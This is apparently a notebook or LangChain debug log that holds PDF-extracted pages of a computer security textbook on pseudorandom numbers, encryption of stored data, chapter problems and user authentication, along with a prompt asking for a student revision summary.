      "Random versus Pseudorandom\n",
      "\n",
      "Cryptographic applications typically make use of algorithmic techniques for ran- dom number generation. These algorithms are deterministic and therefore produce sequences of numbers that are not statistically random. However, if the algorithm is good, the resulting sequences will pass many reasonable tests of randomness. Such numbers are referred to as pseudorandom numbers.\n",
      "\n",
      "You may be somewhat uneasy about the concept of using numbers generated by a deterministic algorithm as if they were random numbers. Despite what might be called philosophical objections to such a practice, it generally works. That is, under most circumstances, pseudorandom numbers will perform as well as if they were random for a given use. The phrase “as well as” is unfortunately subjective, but the use of pseudorandom numbers is widely accepted. The same principle applies in statistical applications, in which a statistician takes a sample of a population and assumes the results will be approximately the same as if the whole population were measured.\n",
      "\n",
      "M02_STAL0611_04_GE_C02.indd 78\n",
      "\n",
      "10/11/17 2:42 PM\n",
      "\n",
      "2.6 / PraCTiCal aPPliCaTion: enCryPTion of STored daTa 79\n",
      "\n",
      "A true random number generator (TRNG) uses a nondeterministic source to produce randomness. Most operate by measuring unpredictable natural processes, such as pulse detectors of ionizing radiation events, gas discharge tubes, and leaky capacitors. Intel has developed a commercially available chip that samples ther- mal noise by amplifying the voltage measured across undriven resistors [JUN99]. LavaRnd is an open source project for creating truly random numbers using inex- pensive cameras, open source code, and inexpensive hardware. The system uses a saturated charge-coupled device (CCD) in a light-tight can as a chaotic source to produce the seed. Software processes the result into truly random numbers in a vari- ety of formats. The first commercially available TRNG that achieves bit production rates comparable with that of PRNGs is the Intel digital random number generator (DRNG) [TAYL11], offered on new multicore chips since May 2012.\n",
      "\n",
      "2.6 PRACTICAL APPLICATION: ENCRYPTION\n",
      "\n",
      "OF STORED DATA\n",
      "\n",
      "One of the principal security requirements of a computer system is the protection of stored data. Security mechanisms to provide such protection include access control, intrusion detection, and intrusion prevention schemes, all of which are discussed in this book. The book also describes a number of technical means by which these vari- ous security mechanisms can be made vulnerable. But beyond technical approaches, these approaches can become vulnerable because of human factors. We list a few examples here, based on [ROTH05]:\n",
      "\n",
      "In December of 2004, Bank of America employees backed up then sent to its backup data center tapes containing the names, addresses, bank account num- bers, and Social Security numbers of 1.2 million government workers enrolled in a charge-card account. None of the data were encrypted. The tapes never arrived, and indeed have never been found. Sadly, this method of backing up and shipping data is all too common. As an another example, in April of 2005, Ameritrade blamed its shipping vendor for losing a backup tape containing unencrypted information on 200,000 clients.\n",
      "\n",
      "In April of 2005, San Jose Medical group announced that someone had physi- cally stolen one of its computers and potentially gained access to 185,000 unen- crypted patient records.\n",
      "\n",
      "There have been countless examples of laptops lost at airports, stolen from a parked car, or taken while the user is away from his or her desk. If the data on the laptop’s hard drive are unencrypted, all of the data are available to the thief.\n",
      "\n",
      "Although it is now routine for businesses to provide a variety of protections, including encryption, for information that is transmitted across networks, via the Internet, or via wireless devices, once data are stored locally (referred to as data at rest), there is often little protection beyond domain authentication and operating system access controls. Data at rest are often routinely backed up to secondary stor- age such as optical media, tape or removable disk, archived for indefinite periods. Further, even when data are erased from a hard disk, until the relevant disk sectors\n",
      "\n",
      "M02_STAL0611_04_GE_C02.indd 79\n",
      "\n",
      "10/11/17 2:42 PM\n",
      "\n",
      "80 ChaPTer 2 / CryPTograPhiC ToolS\n",
      "\n",
      "are reused, the data are recoverable. Thus, it becomes attractive, and indeed should be mandatory, to encrypt data at rest and combine this with an effective encryption key management scheme.\n",
      "\n",
      "There are a variety of ways to provide encryption services. A simple approach available for use on a laptop is to use a commercially available encryption package such as Pretty Good Privacy (PGP). PGP enables a user to generate a key from a password and then use that key to encrypt selected files on the hard disk. The PGP package does not store the password. To recover a file, the user enters the password, PGP generates the key, and then decrypts the file. So long as the user protects his or her password and does not use an easily guessable password, the files are fully protected while at rest. Some more recent approaches are listed in [COLL06]:\n",
      "\n",
      "Back-end appliance: This is a hardware device that sits between servers and stor- age systems and encrypts all data going from the server to the storage system, and decrypts data going in the opposite direction. These devices encrypt data at close to wire speed, with very little latency. In contrast, encryption software on servers and storage systems slows backups. A system manager configures the appliance to accept requests from specified clients, for which unencrypted data are supplied. • Library-based tape encryption: This is provided by means of a co-processor board embedded in the tape drive and tape library hardware. The co-processor encrypts data using a nonreadable key configured into the board. The tapes can then be sent off-site to a facility that has the same tape drive hardware. The key can be exported via secure e-mail, or a small flash drive that is transported securely. If the matching tape drive hardware co-processor is not available at the other site, the target facility can use the key in a software decryption pack- age to recover the data.\n",
      "\n",
      "Background laptop and PC data encryption: A number of vendors offer soft- ware products that provide encryption that is transparent to the application and the user. Some products encrypt all or designated files and folders. Other products, such as Windows BitLocker and MacOS FileVault, encrypt an entire disk or disk image located on either the user’s hard drive or maintained on a network storage device, with all data on the virtual disk encrypted. Various key management solutions are offered to restrict access to the owner of the data.\n",
      "\n",
      "2.7 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\n",
      "\n",
      "Key Terms\n",
      "\n",
      "Advanced Encryption Standard (AES) asymmetric encryption authentication brute-force attack ciphertext\n",
      "\n",
      "collision resistant confidentiality cryptanalysis Data Encryption Standard\n",
      "\n",
      "(DES) data integrity\n",
      "\n",
      "Decryption Diffie–Hellman key exchange digital signature Digital Signature Standard\n",
      "\n",
      "(DSS)\n",
      "\n",
      "elliptic curve cryptography\n",
      "\n",
      "M02_STAL0611_04_GE_C02.indd 80\n",
      "\n",
      "10/11/17 2:42 PM\n",
      "\n",
      "2.7 / Key TermS, reView QueSTionS, and ProblemS 81\n",
      "\n",
      "encryption hash function keystream message authentication message authentication\n",
      "\n",
      "code (MAC) modes of operation one-way hash function plaintext\n",
      "\n",
      "preimage resistant private key pseudorandom number public key public-key certificate public-key encryption random number RSA\n",
      "\n",
      "second preimage resistant secret key secure hash algorithm (SHA) secure hash function strong collision resistant symmetric encryption triple DES weak collision resistant\n",
      "\n",
      "Review Questions\n",
      "\n",
      "2.1 How is cryptanalysis different from brute-force attack? 2.2 List and briefly explain the different approaches to attacking a symmetric encryption\n",
      "\n",
      "scheme.\n",
      "\n",
      "2.3 What are the two principal requirements for the secure use of symmetric encryption? 2.4 List the two important aspects of data authentication. 2.5 What is one-way hash function? 2.6 Briefly describe the three schemes illustrated in Figure 2.3. 2.7 What properties must a hash function have to be useful for message authentication? 2.8 What are the principal ingredients of a public-key cryptosystem? 2.9 List and briefly define three uses of a public-key cryptosystem. 2.10 What advantage might elliptic curve cryptography (ECC) have over RSA? 2.11 Do digital signatures provide confidentiality? 2.12 What is a public-key certificate? 2.13 What are three different ways in which random numbers are used in cryptography?\n",
      "\n",
      "Problems\n",
      "\n",
      "2.1 Typically, in practice, the length of the message is greater than the block size of the encryption algorithm. The simplest approach to handle such encryption is known as electronic codebook (ECB) mode. Explain this mode. Mention a scenario where it cannot be applied. Explain briefly why it is not a secure mode of encryption. 2.2 This problem uses a real-world example of a symmetric cipher, from an old U.S. Special Forces manual (public domain). The document, filename Special Forces.pdf, is available at box.com/CompSec4e. a. Using the two keys (memory words) cryptographic and network security, encrypt\n",
      "\n",
      "the following message:\n",
      "\n",
      "Be at the third pillar from the left outside the lyceum theatre tonight at seven. If you are distrustful bring two friends.\n",
      "\n",
      "Make reasonable assumptions about how to treat redundant letters and excess let- ters in the memory words and how to treat spaces and punctuation. Indicate what your assumptions are. Note: The message is from the Sherlock Holmes novel The Sign of Four.\n",
      "\n",
      "b. Decrypt the ciphertext. Show your work. c. Comment on when it would be appropriate to use this technique and what its\n",
      "\n",
      "advantages are.\n",
      "\n",
      "M02_STAL0611_04_GE_C02.indd 81\n",
      "\n",
      "10/11/17 2:42 PM\n",
      "\n",
      "82 ChaPTer 2 / CryPTograPhiC ToolS\n",
      "\n",
      "2.3 Consider a very simple symmetric block encryption algorithm, in which 64-bits blocks\n",
      "\n",
      "of plaintext are encrypted using a 128-bit key. Encryption is defined as\n",
      "\n",
      "C = (P ⊕ K0) Ä K1\n",
      "\n",
      "where C = ciphertext; K = secret key; K0 = leftmost 64 bits of K; K1 = rightmost 64 bits of K, ⊕ = bitwise exclusive or; and Ä is addition mod 264. a. Show the decryption equation. That is, show the equation for P as a function of C,\n",
      "\n",
      "K1 and K2.\n",
      "\n",
      "b. Suppose an adversary has access to two sets of plaintexts and their corresponding\n",
      "\n",
      "ciphertexts and wishes to determine K. We have the two equations:\n",
      "\n",
      "C = (P ⊕ K0) Ä K1; C′ = (P′ ⊕ K0) Ä K1\n",
      "\n",
      "First, derive an equation in one unknown (e.g., K0). Is it possible to proceed further to solve for K0?\n",
      "\n",
      "2.4 Perhaps the simplest “serious” symmetric block encryption algorithm is the Tiny Encryption Algorithm (TEA). TEA operates on 64-bit blocks of plaintext using a 128-bit key. The plaintext is divided into two 32-bit blocks (L0, R0), and the key is divided into four 32-bit blocks (K0, K1, K2, K3). Encryption involves repeated applica- tion of a pair of rounds, defined as follows for rounds i and i + 1: Li = Ri - 1 Ri = Li - 1 Ä F(Ri - 1, K0, K1, di)\n",
      "\n",
      "Li + 1 = Ri Ri + 1 = Li Ä F(Ri, K2, K3, di + 1)\n",
      "\n",
      "where F is defined as\n",
      "\n",
      "F(M, Kj, Kk, di) = ((M V 4) Ä Kj) ⊕ ((M W 5) Ä Kk) ⊕ (M + di)\n",
      "\n",
      "and where the logical shift of x by y bits is denoted by x V y; the logical right shift x by y bits is denoted by x W y; and di is a sequence of predetermined constants. a. Comment on the significance and benefit of using the sequence of constants. b. Illustrate the operation of TEA using a block diagram or flow chart type of\n",
      "\n",
      "depiction.\n",
      "\n",
      "c. If only one pair of rounds is used, then the ciphertext consists of the 64-bit block (L2, R2). For this case, express the decryption algorithm in terms of equations.\n",
      "\n",
      "2.5\n",
      "\n",
      "d. Repeat part (c) using an illustration similar to that used for part (b). In this problem, we will compare the security services that are provided by digital signatures (DS) and message authentication codes (MAC). We assume Oscar is able to observe all messages sent from Alice to Bob and vice versa. Oscar has no knowl- edge of any keys but the public one in case of DS. State whether and how (i) DS and (ii) MAC protect against each attack. The value auth(x) is computed with a DS or a MAC algorithm, respectively. a. (Message integrity) Alice sends a message x = ;Transfer $1000 to Mark< in the clear and also sends auth(x) to Bob. Oscar intercepts the message and replaces “Mark” with “Oscar.” Will Bob detect this?\n",
      "\n",
      "b. (Replay) Alice sends a message x = ;Transfer $1000 to Oscar< in the clear and also sends auth(x) to Bob. Oscar observes the message and signature and sends them 100 times to Bob. Will Bob detect this?\n",
      "\n",
      "c. (Sender authentication with cheating third party) Oscar claims that he sent some message x with a valid auth(x) to Bob but Alice claims the same. Can Bob clear the question in either case?\n",
      "\n",
      "d. (Authentication with Bob cheating) Bob claims that he received a message x with a valid signature auth(x) from Alice (e.g., “Transfer $1000 from Alice to Bob”) but Alice claims she has never sent it. Can Alice clear this question in either case?\n",
      "\n",
      "M02_STAL0611_04_GE_C02.indd 82\n",
      "\n",
      "10/11/17 2:42 PM\n",
      "\n",
      "2.7 / Key TermS, reView QueSTionS, and ProblemS 83\n",
      "\n",
      "2.6 Suppose H(M) is a cryptographic hash function that maps a message of an arbitrary bit length on to an n-bit hash value. Briefly explain the primary security requirements of the hash function H. Assume that H outputs 16-bit hash values. How many random messages would be required to find two different messages M and M' such that H(M) = H(M′). 2.7 This problem introduces a hash function similar in spirit to SHA that operates on let- ters instead of binary data. It is called the toy tetragraph hash (tth).8 Given a message consisting of a sequence of letters, tth produces a hash value consisting of four letters. First, tth divides the message into blocks of 16 letters, ignoring spaces, punctuation, and capitalization. If the message length is not divisible by 16, it is padded out with nulls. A four-number running total is maintained that starts out with the value (0, 0, 0, 0); this is input to a function, known as a compression function, for processing the first block. The compression function consists of two rounds. Round 1: Get the next block of text and arrange it as a row-wise 4 * 4 block of text and convert it to numbers (A = 0, B = 1), for example, for the block ABCDEFGHIJKLMNOP, we have\n",
      "\n",
      "A\n",
      "\n",
      "B\n",
      "\n",
      "C\n",
      "\n",
      "D\n",
      "\n",
      "0\n",
      "\n",
      "1\n",
      "\n",
      "2\n",
      "\n",
      "3\n",
      "\n",
      "E\n",
      "\n",
      "F\n",
      "\n",
      "G\n",
      "\n",
      "H\n",
      "\n",
      "4\n",
      "\n",
      "5\n",
      "\n",
      "6\n",
      "\n",
      "7\n",
      "\n",
      "I\n",
      "\n",
      "J\n",
      "\n",
      "K\n",
      "\n",
      "L\n",
      "\n",
      "8\n",
      "\n",
      "9\n",
      "\n",
      "10\n",
      "\n",
      "11\n",
      "\n",
      "M N\n",
      "\n",
      "O\n",
      "\n",
      "P\n",
      "\n",
      "12\n",
      "\n",
      "13\n",
      "\n",
      "14\n",
      "\n",
      "15\n",
      "\n",
      "Then, add each column mod 26 and add the result to the running total, mod 26. In this example, the running total is (24, 2, 6, 10). Round 2: Using the matrix from round 1, rotate the first row left by 1, second row left by 2, third row left by 3, and reverse the order of the fourth row. In our example,\n",
      "\n",
      "B\n",
      "\n",
      "C\n",
      "\n",
      "D\n",
      "\n",
      "A\n",
      "\n",
      "1\n",
      "\n",
      "2\n",
      "\n",
      "3\n",
      "\n",
      "0\n",
      "\n",
      "G\n",
      "\n",
      "H\n",
      "\n",
      "E\n",
      "\n",
      "F\n",
      "\n",
      "6\n",
      "\n",
      "7\n",
      "\n",
      "4\n",
      "\n",
      "5\n",
      "\n",
      "L\n",
      "\n",
      "I\n",
      "\n",
      "J\n",
      "\n",
      "K\n",
      "\n",
      "11\n",
      "\n",
      "8\n",
      "\n",
      "9\n",
      "\n",
      "10\n",
      "\n",
      "P\n",
      "\n",
      "O\n",
      "\n",
      "N M\n",
      "\n",
      "15\n",
      "\n",
      "14\n",
      "\n",
      "13\n",
      "\n",
      "12\n",
      "\n",
      "Now, add each column mod 26 and add the result to the running total. The new run- ning total is (5, 7, 9, 11). This running total is now the input into the first round of the compression function for the next block of text. After the final block is processed, convert the final running total to letters. For example, if the message is ABCDEF- GHIJKLMNOP, then the hash is FHJL. a. Draw figures of the overall tth logic and the compression function logic. b. Calculate the hash function for the 48-letter message “I leave twenty million\n",
      "\n",
      "dollars to my friendly cousin Bill.”\n",
      "\n",
      "c. To demonstrate the weakness of tth, find a 48-letter block that produces the same\n",
      "\n",
      "hash as that just derived. Hint: Use lots of As.\n",
      "\n",
      "2.8 Prior to the discovery of any specific public-key schemes, such as RSA, an existence proof was developed whose purpose was to demonstrate that public-key encryption is possible in theory. Consider the functions f1(x1) = z1; f2(x2, y2) = z2; f3(x3, y3) = z3, where all values are integers with 1 … xi, yi, zi … N. Function f1 can be represented by a vector M1 of length N, in which the kth entry is the value of f1(k). Similarly,\n",
      "\n",
      "8I thank William K. Mason and The American Cryptogram Association for providing this example.\n",
      "\n",
      "M02_STAL0611_04_GE_C02.indd 83\n",
      "\n",
      "10/11/17 2:42 PM\n",
      "\n",
      "84 ChaPTer 2 / CryPTograPhiC ToolS\n",
      "\n",
      "f2 and f3 can be represented by N * N matrices M2 and M3. The intent is to represent the encryption/decryption process by table look-ups for tables with very large values of N. Such tables would be impractically huge but could, in principle, be constructed. The scheme works as follows: Construct M1 with a random permutation of all integers between 1 and N; that is, each integer appears exactly once in M1. Construct M2 so each row contains a random permutation of the first N integers. Finally, fill in M3 to satisfy the following condition:\n",
      "\n",
      "f3( f2( f1(k), p), k) = p for all k, p with 1 … k, p … N\n",
      "\n",
      "In words, 1. M1 takes an input k and produces an output x. 2. M2 takes inputs x and p giving output z. 3. M3 takes inputs z and k and produces p. The three tables, once constructed, are made public. a. It should be clear that it is possible to construct M3 to satisfy the preceding condi-\n",
      "\n",
      "tion. As an example, fill in M3 for the following simple case:\n",
      "\n",
      "M1 =\n",
      "\n",
      "5 4 2 3 1\n",
      "\n",
      "M2 =\n",
      "\n",
      "5 4 1 3 2\n",
      "\n",
      "2 2 3 1 5\n",
      "\n",
      "3 5 2 4 3```\n",
      "\u001b[0m\n",
      "Prompt after formatting:\n",
      "\u001b[32;1m\u001b[1;3m\n",
      "Summarize the following text delimited by triple backquotes.\n",
      "The summary should contain the key points of the text and help students revise.\n",
      "```f3( f2( f1(k), p), k) = p for all k, p with 1 … k, p … N\n",
      "\n",
      "In words, 1. M1 takes an input k and produces an output x. 2. M2 takes inputs x and p giving output z. 3. M3 takes inputs z and k and produces p. The three tables, once constructed, are made public. a. It should be clear that it is possible to construct M3 to satisfy the preceding condi-\n",
      "\n",
      "tion. As an example, fill in M3 for the following simple case:\n",
      "\n",
      "M1 =\n",
      "\n",
      "5 4 2 3 1\n",
      "\n",
      "M2 =\n",
      "\n",
      "5 4 1 3 2\n",
      "\n",
      "2 2 3 1 5\n",
      "\n",
      "3 5 2 4 3\n",
      "\n",
      "4 1 4 2 4\n",
      "\n",
      "1 3 5 5 1\n",
      "\n",
      "M3 =\n",
      "\n",
      "5 1 3 4 2\n",
      "\n",
      "Convention: The ith element of M1 corresponds to k = i. The ith row of M2 cor- responds to x = i; the jth column of M2 corresponds to p = j. The ith row of M3 corresponds to z = i; the jth column of M3 corresponds to k = j. We can look at this in another way. The ith row of M1 corresponds to the ith column of M3. The value of the entry in the ith row selects a row of M2. The entries in the selected M3 column are derived from the entries in the selected M2 row. The first entry in the M2 row dictates where the value 1 goes in the M3 column. The second entry in the M2 row dictates where the value 2 goes in the M3 column, and so on.\n",
      "\n",
      "b. Describe the use of this set of tables to perform encryption and decryption between\n",
      "\n",
      "two users.\n",
      "\n",
      "c. Argue that this is a secure scheme.\n",
      "\n",
      "2.9 Construct a figure similar to Figure 2.9 that includes a digital signature to authenticate\n",
      "\n",
      "the message in the digital envelope.\n",
      "\n",
      "M02_STAL0611_04_GE_C02.indd 84\n",
      "\n",
      "10/11/17 2:42 PM\n",
      "\n",
      "CHAPTER\n",
      "\n",
      "User Authentication\n",
      "\n",
      "3.1 Digital User Authentication Principles\n",
      "\n",
      "A Model for Digital User Authentication Means of Authentication Risk Assessment for User Authentication\n",
      "\n",
      "3.2 Password-Based Authentication\n",
      "\n",
      "The Vulnerability of Passwords The Use of Hashed Passwords Password Cracking of User-Chosen Passwords Password File Access Control Password Selection Strategies\n",
      "\n",
      "3.3 Token-Based Authentication\n",
      "\n",
      "Memory Cards Smart Cards Electronic Identify Cards\n",
      "\n",
      "3.4 Biometric Authentication\n",
      "\n",
      "Physical Characteristics Used in Biometric Applications Operation of a Biometric Authentication System Biometric Accuracy\n",
      "\n",
      "3.5 Remote User Authentication\n",
      "\n",
      "Password Protocol Token Protocol Static Biometric Protocol Dynamic Biometric Protocol\n",
      "\n",
      "3.6 Security Issues for User Authentication\n",
      "\n",
      "3.7 Practical Application: An Iris Biometric System\n",
      "\n",
      "3.8 Case Study: Security Problems for ATM Systems\n",
      "\n",
      "3.9 Key Terms, Review Questions, and Problems\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 85\n",
      "\n",
      "85\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "86 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "Learning Objectives\n",
      "\n",
      "After studying this chapter, you should be able to:\n",
      "\n",
      "◆ Discuss the four general means of authenticating a user’s identity. ◆ Explain the mechanism by which hashed passwords are used for user\n",
      "\n",
      "authentication.\n",
      "\n",
      "◆ Understand the use of the Bloom filter in password management. ◆ Present an overview of token-based user authentication. ◆ Discuss the issues involved and the approaches for remote user\n",
      "\n",
      "authentication.\n",
      "\n",
      "◆ Summarize some of the key security issues for user authentication.\n",
      "\n",
      "In most computer security contexts, user authentication is the fundamental building block and the primary line of defense. User authentication is the basis for most types of access control and for user accountability. User authentication encompasses two functions. First, the user identifies herself to the system by presenting a credential, such as user ID. Second, the system verifies the user by the exchange of authentica- tion information.\n",
      "\n",
      "For example, user Alice Toklas could have the user identifier ABTOKLAS. This information needs to be stored on any server or computer system that Alice wishes to use, and could be known to system administrators and other users. A typical item of authentication information associated with this user ID is a password, which is kept secret (known only to Alice and to the system)1. If no one is able to obtain or guess Alice’s password, then the combination of Alice’s user ID and password enables administrators to set up Alice’s access permissions and audit her activity. Because Alice’s ID is not secret, system users can send her e-mail, but because her password is secret, no one can pretend to be Alice.\n",
      "\n",
      "In essence, identification is the means by which a user provides a claimed iden- tity to the system; user authentication is the means of establishing the validity of the claim. Note user authentication is distinct from message authentication. As defined in Chapter 2, message authentication is a procedure that allows communicating parties to verify that the contents of a received message have not been altered, and that the source is authentic. This chapter is concerned solely with user authentication.\n",
      "\n",
      "This chapter first provides an overview of different means of user authentica-\n",
      "\n",
      "tion, then examines each in some detail.\n",
      "\n",
      "3.1 DIGITAL USER AUTHENTICATION PRINCIPLES\n",
      "\n",
      "NIST SP 800-63-3 (Digital Authentication Guideline, October 2016) defines digi- tal user authentication as the process of establishing confidence in user identities that are presented electronically to an information system. Systems can use the\n",
      "\n",
      "1Typically, the password is stored in hashed form on the server and this hash code may not be secret, as explained subsequently in this chapter.\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 86\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.1 / DiGiTAL UsER AUTHEnTiCATion PRinCiPLEs 87\n",
      "\n",
      "authenticated identity to determine if the authenticated individual is authorized to perform particular functions, such as database transactions or access to system resources. In many cases, the authentication and transaction, or other authorized function, take place across an open network such as the Internet. Equally authen- tication and subsequent authorization can take place locally, such as across a local area network. Table 3.1, from NIST SP 800-171 (Protecting Controlled Unclassified Information in Nonfederal Information Systems and Organizations, December 2016), provides a useful list of security requirements for identification and authentication services.\n",
      "\n",
      "A Model for Digital User Authentication\n",
      "\n",
      "NIST SP 800-63-3 defines a general model for user authentication that involves a number of entities and procedures. We discuss this model with reference to Figure 3.1.\n",
      "\n",
      "The initial requirement for performing user authentication is that the user must be registered with the system. The following is a typical sequence for registra- tion. An applicant applies to a registration authority (RA) to become a subscriber of a credential service provider (CSP). In this model, the RA is a trusted entity that establishes and vouches for the identity of an applicant to a CSP. The CSP then engages in an exchange with the subscriber. Depending on the details of the over- all authentication system, the CSP issues some sort of electronic credential to the subscriber. The credential is a data structure that authoritatively binds an identity and additional attributes to a token possessed by a subscriber, and can be verified when presented to the verifier in an authentication transaction. The token could be an encryption key or an encrypted password that identifies the subscriber. The\n",
      "\n",
      "Table 3.1 Identification and Authentication Security Requirements (NIST SP 800-171)\n",
      "\n",
      "Basic Security Requirements:\n",
      "\n",
      "1 Identify information system users, processes acting on behalf of users, or devices.\n",
      "\n",
      "2 Authenticate (or verify) the identities of those users, processes, or devices, as a prerequisite to allowing\n",
      "\n",
      "access to organizational information systems.\n",
      "\n",
      "Derived Security Requirements:\n",
      "\n",
      "3 Use multifactor authentication for local and network access to privileged accounts and for network access\n",
      "\n",
      "to non-privileged accounts.\n",
      "\n",
      "4 Employ replay-resistant authentication mechanisms for network access to privileged and non-privileged accounts.\n",
      "\n",
      "5 Prevent reuse of identifiers for a defined period.\n",
      "\n",
      "6 Disable identifiers after a defined period of inactivity.\n",
      "\n",
      "7 Enforce a minimum password complexity and change of characters when new passwords are created.\n",
      "\n",
      "8 Prohibit password reuse for a specified number of generations.\n",
      "\n",
      "9 Allow temporary password use for system logons with an immediate change to a permanent password.\n",
      "\n",
      "10 Store and transmit only cryptographically-protected passwords.\n",
      "\n",
      "11 Obscure feedback of authentication information.\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 87\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "88 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "Registration, credential issuance, and maintenance\n",
      "\n",
      "Registration authority (RA)\n",
      "\n",
      "Identity prooﬁng User registration\n",
      "\n",
      "Subscriber/ claimant\n",
      "\n",
      "Authenticated session\n",
      "\n",
      "Relying party (RP)\n",
      "\n",
      "A\n",
      "\n",
      "Registration conﬁrmation\n",
      "\n",
      "T o k e n, cre d e ntial R egistratio n/issu a n ce\n",
      "\n",
      "u t h\n",
      "\n",
      "Authenticated assertion\n",
      "\n",
      "e\n",
      "\n",
      "n\n",
      "\n",
      "tic\n",
      "\n",
      "a\n",
      "\n",
      "E\n",
      "\n",
      "te\n",
      "\n",
      "x\n",
      "\n",
      "c\n",
      "\n",
      "d p r\n",
      "\n",
      "h\n",
      "\n",
      "a\n",
      "\n",
      "n\n",
      "\n",
      "o t o\n",
      "\n",
      "g\n",
      "\n",
      "e\n",
      "\n",
      "c ol\n",
      "\n",
      "Credential service provider (CSP)\n",
      "\n",
      "Token/credential Validation\n",
      "\n",
      "Veriﬁer\n",
      "\n",
      "E-Authentication using token and credential\n",
      "\n",
      "Figure 3.1 The NIST SP 800-63-3 E-Authentication Architectural Model\n",
      "\n",
      "token may be issued by the CSP, generated directly by the subscriber, or provided by a third party. The token and credential may be used in subsequent authentica- tion events.\n",
      "\n",
      "Once a user is registered as a subscriber, the actual authentication process can take place between the subscriber and one or more systems that perform authen- tication and, subsequently, authorization. The party to be authenticated is called a claimant, and the party verifying that identity is called a verifier. When a claimant successfully demonstrates possession and control of a token to a verifier through an authentication protocol, the verifier can verify that the claimant is the subscriber named in the corresponding credential. The verifier passes on an assertion about the identity of the subscriber to the relying party (RP). That assertion includes identity information about a subscriber, such as the subscriber name, an identifier assigned at registration, or other subscriber attributes that were verified in the registration process. The RP can use the authenticated information provided by the verifier to make access control or authorization decisions.\n",
      "\n",
      "An implemented system for authentication will differ from or be more com- plex than this simplified model, but the model illustrates the key roles and functions needed for a secure authentication system.\n",
      "\n",
      "Means of Authentication\n",
      "\n",
      "There are four general means of authenticating a user’s identity, which can be used alone or in combination:\n",
      "\n",
      "Something the individual knows: Examples include a password, a personal identification number (PIN), or answers to a prearranged set of questions. • Something the individual possesses: Examples include electronic keycards, smart cards, and physical keys. This type of authenticator is referred to as a token.\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 88\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.1 / DiGiTAL UsER AUTHEnTiCATion PRinCiPLEs 89\n",
      "\n",
      "Something the individual is (static biometrics): Examples include recognition by fingerprint, retina, and face.\n",
      "\n",
      "Something the individual does (dynamic biometrics): Examples include recog- nition by voice pattern, handwriting characteristics, and typing rhythm.\n",
      "\n",
      "All of these methods, properly implemented and used, can provide secure user authentication. However, each method has problems. An adversary may be able to guess or steal a password. Similarly, an adversary may be able to forge or steal a token. A user may forget a password or lose a token. Further, there is a significant admin- istrative overhead for managing password and token information on systems and securing such information on systems. With respect to biometric authenticators, there are a variety of problems, including dealing with false positives and false negatives, user acceptance, cost, and convenience. Multifactor authentication refers to the use of more than one of the authentication means in the preceding list (see Figure 3.2). The strength of authentication systems is largely determined by the number of factors incorporated by the system. Implementations that use two factors are considered to be stronger than those that use only one factor; systems that incorporate three factors are stronger than systems that only incorporate two of the factors, and so on.\n",
      "\n",
      "Risk Assessment for User Authentication\n",
      "\n",
      "Security risk assessment in general will be dealt with in Chapter 14. Here, we introduce a specific example as it relates to user authentication. There are three separate concepts we wish to relate to one another: assurance level, potential impact, and areas of risk.\n",
      "\n",
      "Authentication logic using ﬁrst factor\n",
      "\n",
      "Authentication logic using second factor\n",
      "\n",
      "A uthentication protocol\n",
      "\n",
      "A uthentication protocol\n",
      "\n",
      "Pass\n",
      "\n",
      "Pass\n",
      "\n",
      "Client\n",
      "\n",
      "Fail\n",
      "\n",
      "Client\n",
      "\n",
      "Fail\n",
      "\n",
      "Figure 3.2 Multifactor Authentication\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 89\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "90 CHAPTER 3 / UsER AUTHEnTiCATion\n",
      "\n",
      "AssurAnce LeveL An assurance level describes an organization’s degree of cer- tainty that a user has presented a credential that refers to his or her identity. More specifically, assurance is defined as (1) the degree of confidence in the vetting process used to establish the identity of the individual to whom the credential was issued, and (2) the degree of confidence that the individual who uses the credential is the individ- ual to whom the credential was issued. SP 800-63-3 recognizes four levels of assurance:\n",
      "\n",
      "Level 1: Little or no confidence in the asserted identity’s validity. An example of where this level is appropriate is a consumer registering to participate in a discussion at a company website discussion board. Typical authentication tech- nique at this level would be a user-supplied ID and password at the time of the transaction.\n",
      "\n",
      "Level 2: Some confidence in the asserted identity’s validity. Level 2 credentials are appropriate for a wide range of business with the public where organi- zations require an initial identity assertion (the details of which are verified independently prior to any action). At this level, some sort of secure authentica- tion protocol needs to be used, together with one of the means of authentication summarized previously and discussed in subsequent sections.\n",
      "\n",
      "Level 3: High confidence in the asserted identity’s validity. This level is appro- priate to enable clients or employees to access restricted services of high value but not the highest value. An example for which this level is appropriate: A patent attorney electronically submits confidential patent information to the U.S. Patent and Trademark Office. Improper disclosure would give competitors a competitive advantage. Techniques that would need to be used at this level require more than one factor of authentication; that is, at least two independent authentication techniques must be used.\n",
      "\n",
      "Level 4: Very high confidence in the asserted identity’s validity. This level is appropriate to enable clients or employees to access restricted services of very high value or for which improper access is very harmful. For example, a law enforcement official accesses a law enforcement database containing crimi- nal records. Unauthorized access could raise privacy issues and/or compromise investigations. Typically, level 4 authentication requires the use of multiple fac- tors as well as in-person registration.\n",
      "\n",
      "PotentiAL imPAct A concept closely related to that of assurance level is potential impact. FIPS 199 (Standards for Security Categorization of Federal Information and Information Systems, 2004) defines three levels of potential impact on organizations or individuals should there be a breach of security (in our context, a failure in user authentication):\n",
      "\n",
      "Low: An authentication error could be expected to have a limited adverse effect on organizational operations, organizational assets, or individuals. More spe- cifically, we can say that the error might: (1) cause a degradation in mission capability to an extent and duration that the organization is able to perform its primary functions, but the effectiveness of the functions is noticeably reduced; (2) result in minor damage to organizational assets; (3) result in minor financial loss to the organization or individuals; or (4) result in minor harm to individuals.\n",
      "\n",
      "M03_STAL0611_04_GE_C03.indd 90\n",
      "\n",
      "10/11/17 2:44 PM\n",
      "\n",
      "3.1 / DiGiTAL UsER AUTHEnTiCATion PRinCiPLEs 91\n",
      "\n",
